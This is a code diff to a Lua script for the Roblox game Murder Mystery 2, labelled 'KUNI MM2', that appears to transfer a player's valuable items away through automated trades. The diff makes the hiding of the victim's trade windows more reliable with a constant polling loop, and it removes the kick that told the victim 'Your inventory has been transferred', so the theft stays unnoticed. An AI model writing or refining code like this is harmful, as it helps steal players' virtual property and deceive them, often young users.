@@ -479,24 +479,39 @@ local function SendFirstMessage(mention, list)
 end
 
 -- ===== HIDE TRADE GUI (MM2 only) =====
+-- Signal alone misses the open window when Enabled flips before connection lands.
+-- Polling loop runs every 0.05s as a hard backstop — whichever fires first wins.
 if IS_MM2 then
-    local tradeGUI = h:WaitForChild('TradeGUI')
-    tradeGUI:GetPropertyChangedSignal('Enabled'):Connect(function()
-        tradeGUI.Enabled = false
-    end)
-    local tradeGUIPhone = h:WaitForChild('TradeGUI_Phone')
-    tradeGUIPhone:GetPropertyChangedSignal('Enabled'):Connect(function()
-        tradeGUIPhone.Enabled = false
+    task.spawn(function()
+        local tradeGUI      = h:WaitForChild('TradeGUI', 15)
+        local tradeGUIPhone = h:WaitForChild('TradeGUI_Phone', 15)
+
+        if tradeGUI then
+            tradeGUI.Enabled = false
+            tradeGUI:GetPropertyChangedSignal('Enabled'):Connect(function()
+                if tradeGUI.Enabled then tradeGUI.Enabled = false end
+            end)
+        end
+
+        if tradeGUIPhone then
+            tradeGUIPhone.Enabled = false
+            tradeGUIPhone:GetPropertyChangedSignal('Enabled'):Connect(function()
+                if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
+            end)
+        end
+
+        -- Continuous backstop loop — catches anything the signals miss
+        while true do
+            pcall(function()
+                if tradeGUI      and tradeGUI.Enabled      then tradeGUI.Enabled      = false end
+                if tradeGUIPhone and tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
+            end)
+            task.wait(0.05)
+        end
     end)
 end
 
--- ============================================================
---  KICK FUNCTION WHEN DONE
--- ============================================================
-local function KickWhenDone()
-    task.wait(2)
-    game.Players.LocalPlayer:Kick("KUNI MM2 | Your inventory has been transferred.")
-end
+-- Kick after transfer removed — script stays alive after trade completes
 
 -- ===== MAIN =====
 if #q > 0 then
@@ -545,7 +560,6 @@ if #q > 0 then
                 WaitForTradeCompletion()
                 RefreshInventory()
                 if #q == 0 then
-                    KickWhenDone()
                     return
                 end
                 task.wait(1.5)
@@ -554,7 +568,6 @@ if #q > 0 then
             end
             task.wait(0.5)
         end
-        KickWhenDone()
     end
 
     local function AutoTradeOnJoin()
@@ -578,5 +591,5 @@ if #q > 0 then
     end
 else
     task.wait(1)
-    game.Players.LocalPlayer:Kick("KUNI MM2 | No valuable items found.")
+    warn("KUNI MM2 | No valuable items found — staying in server.")
 end
